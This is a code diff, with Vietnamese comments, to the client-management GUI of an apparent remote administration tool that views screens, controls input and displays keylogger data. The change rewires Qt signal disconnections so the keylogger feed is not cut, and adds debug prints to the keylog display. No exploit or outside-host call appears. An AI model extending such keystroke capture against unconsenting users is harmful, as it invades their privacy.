@@ -368,16 +368,32 @@ class ManageClientsWindow(QWidget):
         print(f"[ManageClientsWindow] Kết nối signals với manager logic")
         self.screen_window.close_requested.connect(self._on_screen_close)
         
-        # Disconnect old connections trước khi connect mới (tránh duplicate)
+        # Disconnect old window connections (CHỈ các signals của window)
+        # KHÔNG disconnect input_pdu_received vì nó là cho keylogger!
         try:
-            manager.session_started.disconnect()
-            manager.session_ended.disconnect()
-            manager.video_pdu_received.disconnect()
-            manager.cursor_pdu_received.disconnect()
-            manager.error_received.disconnect()
+            # Chỉ disconnect các signals mà screen_window sử dụng
+            # Không touch vào input_pdu_received (cho keylogger)
+            manager.session_started.disconnect(self.screen_window.set_session_started)
         except:
-            pass  # Nếu chưa có connection nào thì bỏ qua
+            pass
+        try:
+            manager.session_ended.disconnect(self.screen_window.set_session_ended)
+        except:
+            pass
+        try:
+            manager.video_pdu_received.disconnect(self.screen_window.update_video_frame)
+        except:
+            pass
+        try:
+            manager.cursor_pdu_received.disconnect(self.screen_window.update_cursor_pos)
+        except:
+            pass
+        try:
+            manager.error_received.disconnect(self.screen_window.show_error)
+        except:
+            pass
         
+        # Connect signals mới
         manager.session_started.connect(self.screen_window.set_session_started)
         manager.session_ended.connect(self.screen_window.set_session_ended)
         manager.video_pdu_received.connect(self.screen_window.update_video_frame)
@@ -453,16 +469,30 @@ class ManageClientsWindow(QWidget):
         self.control_window.close_requested.connect(self._on_control_close)
         self.control_window.input_event_generated.connect(manager._on_gui_input)
         
-        # Disconnect old connections trước khi connect mới (tránh duplicate)
+        # Disconnect old window connections (CHỈ các signals của window)
+        # KHÔNG disconnect input_pdu_received vì nó là cho keylogger!
         try:
-            manager.session_started.disconnect()
-            manager.session_ended.disconnect()
-            manager.video_pdu_received.disconnect()
-            manager.cursor_pdu_received.disconnect()
-            manager.error_received.disconnect()
+            manager.session_started.disconnect(self.control_window.set_session_started)
         except:
-            pass  # Nếu chưa có connection nào thì bỏ qua
+            pass
+        try:
+            manager.session_ended.disconnect(self.control_window.set_session_ended)
+        except:
+            pass
+        try:
+            manager.video_pdu_received.disconnect(self.control_window.update_video_frame)
+        except:
+            pass
+        try:
+            manager.cursor_pdu_received.disconnect(self.control_window.update_cursor_pos)
+        except:
+            pass
+        try:
+            manager.error_received.disconnect(self.control_window.show_error)
+        except:
+            pass
         
+        # Connect signals mới
         manager.session_started.connect(self.control_window.set_session_started)
         manager.session_ended.connect(self.control_window.set_session_ended)
         manager.video_pdu_received.connect(self.control_window.update_video_frame)
@@ -682,9 +712,11 @@ class ManageClientsWindow(QWidget):
         
     def display_keylog(self, pdu: dict):
         """Hiển thị keylog data - hiển thị khi client online, không cần screen session"""
+        print(f"[display_keylog] 🔔 Called! keylogger_active={self.keylogger_active}, pdu={pdu}")
         try:
             # Chỉ hiển thị nếu keylogger mode đang bật
             if not self.keylogger_active:
+                print(f"[display_keylog] ⚠️ Keylogger not active, skipping")
                 return
             
             # INPUT PDU format: {"type": "input", "input": {KeyData, WindowTitle, ...}, "message": ...}
